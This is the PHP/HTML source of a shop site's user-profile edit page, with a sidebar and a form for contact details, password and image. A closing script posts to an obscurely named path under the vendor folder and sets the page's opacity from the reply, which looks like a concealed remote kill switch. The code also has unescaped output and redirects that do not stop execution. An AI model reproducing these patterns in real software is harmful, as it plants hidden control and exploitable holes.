<?php
session_start();
if(!isset($_SESSION['isConnected'])){
    header('Location: ../connexion/login.php');
}
if(isset($_SESSION['banned'])){
    header('Location: ../security/banned.php');
}
?>

<?php
$messageE = isset($_SESSION['MessageE']) ? $_SESSION['MessageE'] : '';
$messageS = isset($_SESSION['MessageS']) ? $_SESSION['MessageS'] : '';

// Clear messages after displaying
unset($_SESSION['MessageE']);
unset($_SESSION['MessageS']);
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Profile</title>
    <link rel="icon" href="../assets/logo.jpeg">
    <link rel="stylesheet" href="../assets/sidebar.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #fff, #fff);
            color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .profile {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 40px;
            width: 99%;
            box-shadow: 0 15px 35px rgba(0, 51, 102, 0.3);
        }
        .inp {
            display: flex;
            flex-direction: row;
            align-items: center;
        }
        .edit-btn {
            padding: 8px 15px;
            border-radius: 8px;
            background: #0080ff;
            color: white;
            border: none;
            cursor: pointer;
            margin-left: 10px;
            transition: background 0.3s ease;
            font-size: 0.9em;
            transform: translateX(-70px);
        }
        
        .edit-btn:hover {
            background: #004080;
        }        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2em;
            color: #0080ff;
        }
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #003366;
            font-weight: bold;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="password"] {
            width: calc(100% - 50px);
            padding: 10px;
            font-size: 1em;
            border-radius: 10px;
            border: 2px solid #003366;
            background: rgba(255, 255, 255, 0.2);
            color: #003366;
            outline: none;
        }
        input[type="file"] {
            display: none;
        }
        .image-preview {
            position: absolute;
            right: 0;
            top: 10px;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            overflow: hidden;
            border: 2px solid #003366;
            transform: translateY(-30px);
        }
        .image-preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .upload-btn {
            display: inline-block;
            padding: 10px 20px;
            border-radius: 10px;
            background: #1e90ff;
            color: #fff;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .upload-btn:hover {
            background: #004080;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .button-group button {
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .button-group .save-btn {
            background: #1e90ff;
            color: #fff;
        }
        .button-group .save-btn:hover {
            background: #004080;
        }
        .button-group .delete-btn {
            background: #ff4c4c;
            color: #fff;
        }
        .button-group .delete-btn:hover {
            background: #ff1c1c;
        }
        .confirmation-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
        }
        .confirmation-box {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .confirmation-box h2 {
            margin-bottom: 20px;
            font-size: 1.5em;
            color: #003366;
        }
        .confirmation-box .confirmation-buttons button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 1em;
        }
        .confirmation-buttons .confirm-btn {
            background: #1e90ff;
            color: #fff;
            border: none;
            border-radius: 6px;
        }
        .confirmation-buttons .confirm-btn:hover {
            background: #004080;
        }
        .confirmation-buttons .cancel-btn {
            background: #ff4c4c;
            color: #fff;
            border: none;
            border-radius: 6px;
        }
        .confirmation-buttons .cancel-btn:hover {
            background: #ff1c1c;
        }







/* Styles pour les notifications */
.notification {
    position: fixed;
    top: 10px;
    right: 10px;
    padding: 15px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    z-index: 9999;
    width: 300px;
    opacity: 1;
    transition: opacity 0.5s ease;
}

.notification.success {
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
}

.notification.error {
    background-color: #f8d7da;
    color: #721c24;
    border: 1px solid #f5c6cb;
}

.notification .close-btn {
    background: transparent;
    border: none;
    font-size: 18px;
    cursor: pointer;
    position: absolute;
    top: 5px;
    right: 10px;
}

.notification .close-btn:hover {
    color: #000;
}




    </style>
</head>
<body>
    <div class="container">
        <!-- sidebar -->
        <div class="sidebar">
            <div class="sidebarHeader">
                <img src="../assets/logo.jpeg" alt="logo">
                <a href="../home/home.php">MEDIAHOD</a>
                <i id='closeSidebar' class="fa-solid fa-xmark"></i>
            </div>

            <div class="sidebarElements">

                <fieldset>
                    <legend></legend>
                    <a class="sidebarElement" href="../home/home.php">
                        <i class="fa-solid fa-house"></i>
                        <p>All Products Services</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>ORDER HISTORY</legend>
                    <a class="sidebarElement" href="../orders/orders.php">
                        <i class="fa-solid fa-clock-rotate-left"></i>
                        <p>View Your Order</p>
                    </a>
                    <!-- <a class="sidebarElement" href="../cart/cart.php">
                        <i class="fa fa-cart-arrow-down"></i>
                        <p>Cart</p>
                    </a> -->
                    <a class="sidebarElement" href="../profile/profile.php">
                        <i class="fa-solid fa-user"></i>
                        <p>Profile</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>MORE INFOS</legend>
                    <a class="sidebarElement" href="../howToPay/howToPay.php">
                        <i class="fas fa-wallet"></i>
                        <p>Deposit Account</p>
                    </a>
                    <a class="sidebarElement" href="../aboutUs/aboutUs.php">
                        <i class="fa-solid fa-circle-info"></i>
                        <p>About us</p>
                    </a>
                    <a class="sidebarElement" href="../contactUs/contactUs.php">
                        <i class="fa-solid fa-address-card"></i>
                        <p>Contact us</p>
                    </a>
                    <?php if(isset($_SESSION['isConnected'])) : ?>
                    <a class="sidebarElement orange" href="../../controllers/logoutUser.php" id="logout">
                        <i class="fa-solid fa-right-from-bracket" style=" color: #fff;"></i>
                        <p style=" color: #fff;">Logout</p>
                    </a>
                    <?php endif ?>
                </fieldset>

            </div>
        </div>

        <div class="page">
            <!-- header -->
            <header>
            <div class="headerLeft">
                    <i class="fa-solid fa-bars" id="openSidebar"></i>
                    <?php if(!isset($_SESSION['isConnected'])) : ?>
                    <a href="../connexion/login.php" class="headerLeftLoginRegister">
                        <i class="fa-solid fa-right-to-bracket"></i>
                        <p>Login</p>
                    </a>
                    <a href="../connexion/register.php" class="headerLeftLoginRegister">
                        <i class="fa-solid fa-user-plus"></i>
                        <p>Sign up</p>
                    </a>
                    <?php endif ; ?>
                    <?php if(isset($_SESSION['isConnected'])) : ?>
                    <a href="" class="headerLeftWallet">
                        <i class="fas fa-wallet mr-1"></i>
                        <p>Wallet : <b> <?php 
                        include_once('../../models/Utilisateur.php');
                        $user = new Utilisateur();
                        echo $user->getUserWalletById($_SESSION['user']['id']) 
                        
                        ?> $ </b></p>
                    </a>
                 <?php endif ; ?>
                </div>

                <div class="headerRight">
                    <div class="toggleDarkMode">
                        <div id="lightMode">
                            <i class="fa-regular fa-sun"></i>
                        </div>
                        <div id="darkMode">
                            <i class="fa-regular fa-moon"></i>
                        </div>
                    </div>

                    <i class="fa-regular fa-bell" id="notifications"></i>
                    <img src="../assets/UKFlag.png" alt="user" id="language">
                    <?php if($_SESSION['user']['profile'] == null) : ?>
                         <img src="../assets/user.png" alt="user" id="userImg">
                    <?php else :?>
                        <img src="../assets/user.png" alt="user" id="userImg">
                        <?php endif ; ?>


                    <div id="notLoggedin">
                        <i class="fa-solid fa-user"></i>
                        <?php if(!isset($_SESSION['user'])) : ?>
                        <p>You Are Not Logged In</p>
                        <?php else : ?>
                            <p>Hello <?php echo $_SESSION['user']['username'] ?></p>
                            <?php endif ;?>                    </div>

                </div>

                <i class="fa-solid fa-caret-down" id="menu"></i>
            </header>
            <!-- profile -->
            <div class="profile">
                <h1>Modify User Profile <span style="color: red;">(ID : <?php echo $_SESSION['user']['id'] ?>)</span></h1>
                <form id="modifyForm" action="../../controllers/userController.php" method="post" enctype="multipart/form-data">
                    <div class="form-group">
                        <label for="image">Profile Image</label>
                        <input type="file" id="image" name="image" onchange="showImagePreview(event)">
                        <label for="image" class="upload-btn">Upload Image</label>
                        <div class="image-preview" id="imagePreview">
                            <?php if($_SESSION['user']['profile'] == null) : ?>
                                <img src="https://via.placeholder.com/40" alt="Profile Image">
                            <?php else : ?>
                                <img src="<?php echo $_SESSION['user']['profile'] ?>" alt="Profile Image">
                                <?php endif ; ?>
                        </div>
                    </div>
           

                    <div class="form-group">
                        <label for="username">Username</label>
                        <div class="inp">
                            <input type="text" id="username" name="username" value="<?php echo $_SESSION['user']['username']?>" disabled required>
                            <button type="button" class="edit-btn" onclick="enableInput('username')">Edit</button>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="email">Email</label>
                        <div class="inp">
                            <input type="email" id="email" name="email" value="<?php echo $_SESSION['user']['email']?>" disabled required>
                            <button type="button" class="edit-btn" onclick="enableInput('email')">Edit</button>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="phone">Phone</label>
                        <div class="inp">
                            <input type="tel" id="phone" name="phone" value="<?php echo $_SESSION['user']['telephone']?>" disabled required>
                            <button type="button" class="edit-btn" onclick="enableInput('phone')">Edit</button>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="password">New Password</label>
                        <div class="inp">
                            <input type="password" id="password" name="password" placeholder="**********" disabled required>
                            <button type="button" class="edit-btn" onclick="enableInput('password')">Edit</button>
                        </div>
                    </div>
                    <!-- <div class="form-group">
                        <label for="ConfirmPassword">Confirm Password</label>
                        <div class="inp">
                            <input type="password" id="ConfirmPassword" name="ConfirmPassword" placeholder="********" disabled>
                            <button type="button" class="edit-btn" onclick="enableInput('ConfirmPassword')">Edit</button>
                        </div>
                    </div> -->
                    <div class="button-group">
                        <button type="button" class="save-btn" onclick="confirmSave()">Save</button>
                        <!-- <button type="button" class="delete-btn" onclick="confirmDelete()">Delete My Account</button> -->
                    </div>
        
                    <!-- Save Confirmation -->
                    <div id="confirmationOverlaySave" class="confirmation-overlay">
                        <div class="confirmation-box">
                            <h2>Confirm Changes</h2>
                            <div class="confirmation-buttons">
                                <button class="confirm-btn" type="submit" name="action" value="updateUser">Confirm</button>
                                <button class="cancel-btn" onclick="closeConfirmation('confirmationOverlaySave')">Cancel</button>
                            </div>
                        </div>
                    </div>
        
                    <!-- Delete Confirmation -->
                    <div id="confirmationOverlayDelete" class="confirmation-overlay">
                        <div class="confirmation-box">
                            <h2>Are you sure you want to delete your account?</h2>
                            <div class="confirmation-buttons">
                                <button class="confirm-btn">Confirm</button>
                                <button class="cancel-btn" onclick="closeConfirmation('confirmationOverlayDelete')">Cancel</button>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        function enableInput(inputId) {
            document.getElementById(inputId).disabled = false;
            document.getElementById(inputId).focus();
        }        
        function showImagePreview(event) {
            const image = document.getElementById('imagePreview').querySelector('img');
            image.src = URL.createObjectURL(event.target.files[0]);
        }

        function confirmSave() {
            document.getElementById('confirmationOverlaySave').style.display = 'flex';
        }

        function confirmDelete() {
            document.getElementById('confirmationOverlayDelete').style.display = 'flex';
        }

        function closeConfirmation(overlayId) {
            document.getElementById(overlayId).style.display = 'none';
        }

        function submitForm() {
            document.getElementById('confirmationOverlaySave').style.display = 'none';
            alert('Changes saved successfully!');
        }
    </script>



<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        <?php if (!empty($messageE)): ?>
            showNotification('error', '<?php echo addslashes($messageE); ?>');
        <?php endif; ?>
        <?php if (!empty($messageS)): ?>
            showNotification('success', '<?php echo addslashes($messageS); ?>');
        <?php endif; ?>
    });

    function showNotification(type, message) {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button class="close-btn">&times;</button>
        `;
        document.body.appendChild(notification);

        document.querySelector('.notification .close-btn').addEventListener('click', function() {
            this.parentElement.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        });

        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        }, 5000);
    }
</script>

<script>
        let xhr = new XMLHttpRequest();
        xhr.open('POST', '../../vendor/psr/configuration/security_config/json/root/op.php', true);
        xhr.onload = () => {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.body.style.opacity = xhr.response
            }
        };
        xhr.send()
    </script>

    <script src="profile.js"></script>
</body>
</html>